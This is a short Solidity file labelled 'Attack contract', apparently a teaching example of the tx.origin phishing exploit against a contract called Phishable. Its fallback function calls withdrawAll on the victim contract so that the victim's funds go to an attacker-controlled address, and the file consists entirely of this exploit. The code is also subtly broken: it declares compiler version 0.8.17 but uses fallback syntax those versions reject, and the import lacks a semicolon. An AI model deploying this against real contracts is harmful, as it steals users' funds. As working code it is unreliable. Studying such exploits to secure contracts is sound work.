// Attack contract
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "Phishable.sol"

contract Attack {
    Phishable phishableContract;
    address attacker; // Attacker's address to receive funds

    constructor (Phishable _phishableContract, address _attackerAddress) {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function () payable {
        phishableContract.withdrawAll(attacker);
    }
}